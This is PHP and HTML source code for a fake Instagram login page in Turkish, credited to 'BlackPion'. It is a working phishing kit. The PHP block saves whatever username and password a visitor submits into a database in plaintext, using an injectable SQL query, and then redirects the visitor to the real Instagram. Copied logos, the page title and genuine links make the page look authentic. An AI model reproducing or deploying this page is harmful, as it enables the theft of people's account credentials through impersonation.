
// By BlackPion

<?php 
include("connect.php");

if (isset($_POST["button"])) {

    if (empty($_POST["usrname"]) || empty($_POST["psword"])) {
        
    }
    else {
        $usrname = $_POST["usrname"];
        $psword = $_POST["psword"];

        $add = "INSERT INTO users (username, password) VALUES ('$usrname', '$psword')";

        $add_work = mysqli_query($connect, $add);

        header("Refresh: 1; URL=https://www.instagram.com/");
        exit();

        mysqli_close($connect);
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form action="index.php" method="POST">
                    <label for="email" class="sr-only">Telefon numarası, kullanıcı adı veya e-posta</label>
                    <input type="text" name="usrname" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="border border-danger form-control-sm" />

                    <label for="password" class="sr-only">Şifre</label>
                    <input name="psword" type="password" placeholder="Şifre" class="border border-danger form-control-sm" />

                    <button name="button" type="submit">Giriş yap</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">Veya</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATDjRkxIahcPZIW5NTN_K0YM23OeHKupFHqOUlMdnLKPUD1yQv0eTveiyQhnQOTM1WSBaXeG30oua_zoGwQ7znW30LUVq2RjPB4yHLUQtixBJhOMkE1quvh8tkQJF3B3C6lz826nHyUAnyhLJoIw8JPOiFWz7zGHveEAUyBY5-E_dXashHgqY-R4RdyyXzP18EBU2cf-oNMnAnlKl2KZq50BmkngTVq1dEDk4uubI-83qYNicHvkxRV2K2KBVRkuvQy5">Facebook ile Giriş Yap</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Şifreni mi unuttun?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Hesabın yok mu?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Uygulamayı indir.</p>
                <div class="flex justify-content-center">
                    <a href="https://apps.apple.com/cy/app/instagram/id389801252?l=tr" target="_blank" rel="noopener noreferrer">
                    <img src="apple-button.png"/>
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
                    <img src="googleplay-button.png"/>
                    </a>
                </div>
            </div>
        </section>
    </main>  
</body>
</html>


